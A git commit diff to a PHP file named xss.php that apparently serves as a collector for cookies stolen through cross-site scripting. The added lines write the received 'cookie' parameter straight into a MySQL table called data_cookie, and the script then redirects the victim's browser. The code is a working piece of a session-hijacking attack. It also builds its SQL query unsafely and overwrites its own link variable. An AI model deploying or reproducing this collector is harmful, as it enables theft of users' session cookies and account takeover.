fa1130fa4d668f742fbb2980cd18d82962b64f65
Federico <federicodebona@hotmail.it>
2019-12-13 09:08:38 +0100

    .

--- xss.php
+++ xss.php
@@ -1,6 +1,9 @@
 <?php
 $cookie = $_REQUEST['cookie'];
 $link = $_REQUEST['link'];
+$link = new mysqli("127.0.0.1", "root", "", "xss");
+$link->query("INSERT INTO data_cookie (cookie) VALUES ($cookie)");
+$link->close();
 echo "<a href='$link'>link</a>";
 echo "<script>window.open(document.links[1].baseURI, '_self')</script>";
 ?>
